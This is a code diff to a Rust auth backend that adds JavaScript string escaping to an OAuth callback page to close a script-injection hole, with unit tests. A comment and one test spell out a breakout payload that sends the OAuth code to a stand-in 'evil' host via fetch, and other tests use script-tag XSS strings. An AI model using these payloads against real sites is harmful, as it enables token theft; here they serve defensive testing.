@@ -729,22 +729,58 @@ async fn generate_custom_token(
     Err("Custom token generation requires Firebase Admin SDK - not yet implemented in Rust".into())
 }
 
+/// Escape a value for safe interpolation into a double-quoted JavaScript string
+/// literal inside an inline `<script>` element.
+///
+/// `state` and `redirect_uri` are fully attacker-controllable (they are echoed
+/// back verbatim from the unauthenticated `/v1/auth/authorize` query params), and
+/// `code`/`error` come from the OAuth provider. The callback template drops all
+/// four straight into `const x = "{{ ... }}";`. Without escaping, a value such as
+/// `";fetch("https://evil/?c="+code);//` breaks out of the string literal and runs
+/// arbitrary script in the backend's origin; a literal `</script>` sequence would
+/// likewise terminate the element. Neutralize both by escaping the string-literal
+/// metacharacters and the angle brackets / slash that could re-open HTML parsing.
+fn js_string_escape(value: &str) -> String {
+    let mut escaped = String::with_capacity(value.len());
+    for ch in value.chars() {
+        match ch {
+            '\\' => escaped.push_str("\\\\"),
+            '"' => escaped.push_str("\\\""),
+            '\n' => escaped.push_str("\\n"),
+            '\r' => escaped.push_str("\\r"),
+            '\t' => escaped.push_str("\\t"),
+            // Prevent `</script>` / `<!--` from re-entering HTML parsing and
+            // stop `/` from forming a closing tag.
+            '<' => escaped.push_str("\\u003C"),
+            '>' => escaped.push_str("\\u003E"),
+            '/' => escaped.push_str("\\/"),
+            // JS treats these as line terminators inside string literals.
+            '\u{2028}' => escaped.push_str("\\u2028"),
+            '\u{2029}' => escaped.push_str("\\u2029"),
+            other => escaped.push(other),
+        }
+    }
+    escaped
+}
+
 fn render_auth_callback(
     code: &str,
     state: &str,
     redirect_uri: &str,
     error: Option<&str>,
 ) -> String {
-    // Load template and replace placeholders
+    // Load template and replace placeholders. Every substituted value lands inside
+    // a JS string literal in an inline <script>, so each must be JS-string-escaped
+    // to close the injection class (see js_string_escape).
     let template = include_str!("../../templates/auth_callback.html");
 
     template
-        .replace("{{ code }}", code)
-        .replace("{{ state }}", state)
-        .replace("{{ redirect_uri }}", redirect_uri)
+        .replace("{{ code }}", &js_string_escape(code))
+        .replace("{{ state }}", &js_string_escape(state))
+        .replace("{{ redirect_uri }}", &js_string_escape(redirect_uri))
         .replace(
             "{{ error if error is defined else '' }}",
-            error.unwrap_or(""),
+            &js_string_escape(error.unwrap_or("")),
         )
 }
 
@@ -783,5 +819,69 @@ mod tests {
     fn auth_base_url_accepts_nonblank_values() {
         assert!(is_nonblank_url("https://desktop-backend.example.com"));
         assert!(is_nonblank_url("  https://desktop-backend.example.com  "));
+    }
+
+    #[test]
+    fn js_string_escape_neutralizes_string_literal_breakout() {
+        // A `state`/`redirect_uri` payload crafted to break out of
+        // `const state = "...";` and run arbitrary script.
+        let payload = "\";fetch('https://evil/?c='+code);//";
+        let escaped = js_string_escape(payload);
+        // The leading quote that would close the literal is now escaped, and every
+        // double-quote in the output is backslash-escaped (none can close it).
+        assert!(
+            escaped.starts_with("\\\""),
+            "leading quote escaped: {escaped}"
+        );
+        let bytes = escaped.as_bytes();
+        for (i, &b) in bytes.iter().enumerate() {
+            if b == b'"' {
+                assert!(
+                    i > 0 && bytes[i - 1] == b'\\',
+                    "unescaped quote in {escaped}"
+                );
+            }
+        }
+    }
+
+    #[test]
+    fn js_string_escape_neutralizes_script_tag_breakout() {
+        let escaped = js_string_escape("</script><script>alert(1)</script>");
+        // A literal `</script>` must never survive — it would terminate the
+        // inline <script> element regardless of the JS string context.
+        assert!(
+            !escaped.contains("</script>") && !escaped.contains("</"),
+            "closing tag escaped: {escaped}"
+        );
+        assert!(!escaped.contains('<') && !escaped.contains('>'));
+    }
+
+    #[test]
+    fn js_string_escape_preserves_legitimate_redirect_uris() {
+        // Real desktop redirect_uris contain no metacharacters, so escaping is a
+        // no-op and the OAuth flow is unaffected.
+        assert_eq!(
+            js_string_escape("omi-computer://auth/callback"),
+            "omi-computer:\\/\\/auth\\/callback"
+        );
+        assert_eq!(
+            js_string_escape("http://127.0.0.1:52001/callback"),
+            "http:\\/\\/127.0.0.1:52001\\/callback"
+        );
+    }
+
+    #[test]
+    fn render_auth_callback_escapes_all_interpolated_values() {
+        let html = render_auth_callback(
+            "code\"injected",
+            "</script><script>alert(1)</script>",
+            "https://evil\";document.location='x';//",
+            None,
+        );
+        // The rendered page must not contain an unescaped closing script tag or a
+        // raw injected quote from any of the three attacker-influenced values.
+        assert!(!html.contains("</script><script>"));
+        assert!(!html.contains("code\"injected"));
+        assert!(!html.contains("evil\";document"));
     }
 }
